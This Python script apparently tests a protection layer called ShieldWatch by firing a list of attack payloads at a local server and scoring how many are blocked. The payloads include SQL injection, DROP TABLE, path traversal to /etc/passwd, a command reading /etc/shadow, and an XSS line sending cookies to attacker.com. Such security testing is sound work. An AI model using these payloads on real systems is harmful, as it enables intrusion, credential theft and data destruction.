import requests
import time

# Configuration
TARGET_URL = "http://localhost:3001"
COLLECTOR_URL = "http://localhost:3002"

# Security Test Suite
AUDIT_SUITE = {
    "Injection Attacks": [
        {"path": "/api/auth/login", "data": {"username": "' OR 1=1 --", "password": "x"}, "type": "SQLi"},
        {"path": "/api/messages", "data": {"content": "WAITFOR DELAY '0:0:5'"}, "type": "Blind SQLi"},
        {"path": "/api/profile", "data": {"bio": "<script>fetch('http://attacker.com?c='+document.cookie)</script>"}, "type": "XSS"},
        {"path": "/api/chat", "data": {"text": "<img src=x onerror=alert(1)>"}, "type": "XSS"},
    ],
    "System & File Attacks": [
        {"path": "/api/download?file=../../../../etc/passwd", "method": "GET", "type": "Path Traversal"},
        {"path": "/api/view?path=C:\\Windows\\System32\\drivers\\etc\\hosts", "method": "GET", "type": "Path Traversal"},
        {"path": "/api/debug", "data": {"cmd": "cat /etc/shadow && id"}, "type": "Command Injection"},
        {"path": "/api/exec", "data": {"input": "; python3 -c 'import os; os.system(\"ls\")'"}, "type": "Remote Code Execution"},
    ],
    "Protocol & Logic Attacks": [
        {"path": "/api/auth/login", "data": {"username": "admin" * 1000}, "type": "Buffer Overflow Simulation"},
        {"path": "/api/users/1/delete", "method": "GET", "type": "IDOR Attempt"},
        {"path": "/api/admin/raw-query", "data": {"query": "DROP TABLE users;"}, "type": "Critical SQLi"},
    ],
    "Deception (Honeypots)": [
        {"path": "/.env", "method": "GET", "type": "Secret Discovery"},
        {"path": "/phpmyadmin", "method": "GET", "type": "Database Discovery"},
        {"path": "/wp-admin.php", "method": "GET", "type": "Platform Discovery"},
        {"path": "/admin/config.php", "method": "GET", "type": "Honeypot Trap"},
    ]
}

def run_audit():
    print(f"\n{'-'*60}")
    print(f"🛡️  SHIELDWATCH SECURITY EFFICIENCY AUDIT")
    print(f"{'-'*60}")
    
    stats = {"total": 0, "blocked": 0, "bypassed": 0}
    category_results = {}

    for category, attacks in AUDIT_SUITE.items():
        print(f"\n📂 Category: {category}")
        cat_stats = {"total": 0, "blocked": 0}
        
        for attack in attacks:
            stats["total"] += 1
            cat_stats["total"] += 1
            
            method = attack.get("method", "POST")
            url = TARGET_URL + attack["path"]
            
            try:
                if method == "POST":
                    resp = requests.post(url, json=attack.get("data", {}), timeout=3)
                else:
                    resp = requests.get(url, params=attack.get("data", {}), timeout=3)
                
                # Check if ShieldWatch blocked it (Typically 403 Forbidden or 401 Unauthorized)
                if resp.status_code in [403, 401, 406]:
                    print(f"  [✅ BLOCKED] {attack['type']} on {attack['path']}")
                    stats["blocked"] += 1
                    cat_stats["blocked"] += 1
                else:
                    print(f"  [⚠️  BYPASS ] {attack['type']} on {attack['path']} (Status: {resp.status_code})")
                    stats["bypassed"] += 1
            except Exception as e:
                print(f"  [❌ ERROR  ] Connection failed for {attack['type']}")
            
            time.sleep(0.2) # Avoid flooding
            
        category_results[category] = cat_stats

    # Final Report
    efficiency = (stats["blocked"] / stats["total"]) * 100
    
    print(f"\n{'-'*60}")
    print(f"📊 FINAL AUDIT SUMMARY")
    print(f"{'-'*60}")
    print(f"Total Attacks Sent:     {stats['total']}")
    print(f"Total Blocked:          {stats['blocked']}")
    print(f"Total Bypassed:         {stats['bypassed']}")
    print(f"Efficiency Score:       {efficiency:.1f}%")
    
    print(f"\n[!] Audit complete. Refresh your Dashboard at {COLLECTOR_URL} to see the logs.")
    if efficiency > 90:
        print("🛡️  Result: ShieldWatch is operating at HIGH EFFICIENCY.")
    else:
        print("⚠️  Result: Some bypasses detected. Check RASP signature rules.")

if __name__ == "__main__":
    run_audit()
